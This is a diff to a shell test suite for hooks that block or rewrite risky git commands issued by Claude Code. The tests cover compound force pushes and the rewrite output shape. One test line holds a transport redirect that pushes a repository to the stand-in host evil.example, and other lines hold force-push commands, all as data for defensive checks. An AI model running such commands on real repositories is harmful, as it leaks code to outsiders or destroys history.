@@ -26,6 +26,21 @@ begin_test "git-safety: normal 'git push origin main' still allowed"
 begin_test "git-safety: '+main' refspec still blocked"
 [ "$(gs_verdict "git push origin +main")" = BLOCK ] && pass || fail "+main regressed"
 
+# ---- 2026-10-15 audit follow-up: compound +refspec, and the rewrite's exact shape ----
+begin_test "git-safety: 'git fetch && git push origin +main' is blocked, not rewritten"
+[ "$(gs_verdict "git fetch && git push origin +main")" = BLOCK ] && pass || fail "compound +main evaded"
+# A rewrite is only enforcement if Claude Code accepts it: hookEventName is required,
+# updatedInput replaces the whole tool input, and the force spelling must be gone.
+begin_test "git-safety: a feature-branch force push is rewritten in the exact shape CC accepts"
+OUT=$(bash "$GS" <<<"$(mkjson "git push --force origin feature-x")" 2>/dev/null)
+printf '%s' "$OUT" | python3 -c '
+import json, sys
+h = json.load(sys.stdin)["hookSpecificOutput"]
+assert h["hookEventName"] == "PreToolUse", h
+assert h["updatedInput"] == {"command": "git push origin feature-x"}, h
+assert "permissionDecision" not in h, h
+' 2>/dev/null && pass || fail "rewrite shape wrong: $OUT"
+
 # ---- Finding 7: inline insteadOf transport redirect ----
 begin_test "git-remote-guard: '-c url.<evil>.insteadOf=<github>' push is asked"
 CMD='git -c url."https://evil.example/".insteadOf="https://github.com/" push origin main'
